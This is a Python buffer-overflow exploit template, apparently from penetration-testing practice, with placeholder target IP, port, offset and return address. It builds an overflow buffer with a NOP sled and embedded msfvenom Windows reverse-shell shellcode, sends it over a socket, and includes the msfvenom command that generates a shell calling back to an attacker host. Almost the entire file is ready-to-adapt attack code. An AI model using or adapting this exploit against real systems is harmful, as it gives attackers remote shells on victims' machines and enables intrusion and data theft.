#!/usr/bin/env python3
import socket

ip = "1111" # Change to target
port = 1111 # Change to target

prefix = "OVRFLW " # Change to target
offset = 1111 # Insert offset from pattern_offset
overflow = "A" * offset
retn = "\x00\xaa\xbb\xcc\xdd" # Change jump point address
padding = "\x90" * 16

# msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 EXITFUNC=thread -b "\x00\x11\x22\x33\x44 (badChars)" -f c

payload = ("\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x37\x71\xf8\xa9\x83\xee\xfc\xe2\xf4\xcb\x99\x7a\xa9\x37\x71"
"\x98\x20\xd2\x40\x38\xcd\xbc\x21\xc8\x22\x65\x7d\x73\xfb\x23"
"\xfa\x8a\x81\x38\xc6\xb2\x8f\x06\x8e\x54\x95\x56\x0d\xfa\x85"
"\x17\xb0\x37\xa4\x36\xb6\x1a\x5b\x65\x26\x73\xfb\x27\xfa\xb2"
"\x95\xbc\x3d\xe9\xd1\xd4\x39\xf9\x78\x66\xfa\xa1\x89\x36\xa2"
"\x73\xe0\x2f\x92\xc2\xe0\xbc\x45\x73\xa8\xe1\x40\x07\x05\xf6"
"\xbe\xf5\xa8\xf0\x49\x18\xdc\xc1\x72\x85\x51\x0c\x0c\xdc\xdc"
"\xd3\x29\x73\xf1\x13\x70\x2b\xcf\xbc\x7d\xb3\x22\x6f\x6d\xf9"
"\x7a\xbc\x75\x73\xa8\xe7\xf8\xbc\x8d\x13\x2a\xa3\xc8\x6e\x2b"
"\xa9\x56\xd7\x2e\xa7\xf3\xbc\x63\x13\x24\x6a\x19\xcb\x9b\x37"
"\x71\x90\xde\x44\x43\xa7\xfd\x5f\x3d\x8f\x8f\x30\x8e\x2d\x11"
"\xa7\x70\xf8\xa9\x1e\xb5\xac\xf9\x5f\x58\x78\xc2\x37\x8e\x2d"
"\xf9\x67\x21\xa8\xe9\x67\x31\xa8\xc1\xdd\x7e\x27\x49\xc8\xa4"
"\x6f\xc3\x32\x19\x38\x01\x24\x57\x90\xab\x37\x60\xa4\x20\xd1"
"\x1b\xe8\xff\x60\x19\x61\x0c\x43\x10\x07\x7c\xb2\xb1\x8c\xa5"
"\xc8\x3f\xf0\xdc\xdb\x19\x08\x1c\x95\x27\x07\x7c\x5f\x12\x95"
"\xcd\x37\xf8\x1b\xfe\x60\x26\xc9\x5f\x5d\x63\xa1\xff\xd5\x8c"
"\x9e\x6e\x73\x55\xc4\xa8\x36\xfc\xbc\x8d\x27\xb7\xf8\xed\x63"
"\x21\xae\xff\x61\x37\xae\xe7\x61\x27\xab\xff\x5f\x08\x34\x96"
"\xb1\x8e\x2d\x20\xd7\x3f\xae\xef\xc8\x41\x90\xa1\xb0\x6c\x98"
"\x56\xe2\xca\x18\xb4\x1d\x7b\x90\x0f\xa2\xcc\x65\x56\xe2\x4d"
"\xfe\xd5\x3d\xf1\x03\x49\x42\x74\x43\xee\x24\x03\x97\xc3\x37"
"\x22\x07\x7c")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
